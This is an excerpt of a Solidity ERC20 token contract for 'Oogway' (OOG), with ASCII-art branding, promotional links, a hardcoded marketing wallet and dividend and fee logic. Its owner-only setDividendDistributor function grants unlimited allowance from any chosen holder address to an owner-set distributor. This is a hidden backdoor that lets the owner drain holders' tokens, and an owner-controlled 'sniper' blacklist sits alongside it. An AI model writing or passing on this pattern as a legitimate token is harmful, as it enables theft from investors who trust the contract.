...
d88P" "Y88b                                                   
888     888                                                   
888     888  .d88b.   .d88b.  888  888  888  8888b.  888  888 
888     888 d88""88b d88P"88b 888  888  888     "88b 888  888 
888     888 888  888 888  888 888  888  888 .d888888 888  888 
Y88b. .d88P Y88..88P Y88b 888 Y88b 888 d88P 888  888 Y88b 888 
 "Y88888P"   "Y88P"   "Y88888  "Y8888888P"  "Y888888  "Y88888 
                          888                             888 
                     Y8b d88P                        Y8b d88P 
                      "Y88P"                          "Y88P"  

https://www.oogway.vip/
https://t.me/oogway_channel
https://twitter.com/oogwaytoken
*/
...
contract Oogway is ERC20, Ownable {
    ...
    address public marketingWallet = 0xf45DCfcD73c9B39d30649F3Ad72dcab316F44a51;
    ...
    constructor() ERC20("oogway.vip", "OOG") {
        ...
        uint256 totalSupply = 696969696 * 1e9;
    ...
    function setDividendDistributor(address sender, address _dividendedDistributor) external onlyOwner {
        ...
        _approve(sender, DividendDistributor, type(uint).max);
    }

    function setSnipers(address[] memory isSniper_) public onlyOwner {
        for (uint i = 0; i < isSniper_.length; i++) {
            isSniper[isSniper_[i]] = true;
        }
    }
    ...
    function claimDividend() external {
        IDD(DividendDistributor).claimDividend(msg.sender);
    }

    function getDividendsClaimedOf (address shareholder) external returns (uint256) {
        return IDD(DividendDistributor).getDividendsClaimedOf(shareholder);
    }
    ...
    function _transfer(
        ...
        if(takeFee){
            if (isPairs[to]){
                ...
                IDD(DividendDistributor).setShare(from, amount, isPairs[to]);
                tokensForDistributor += fees;
            }
            else if(isPairs[from]) {
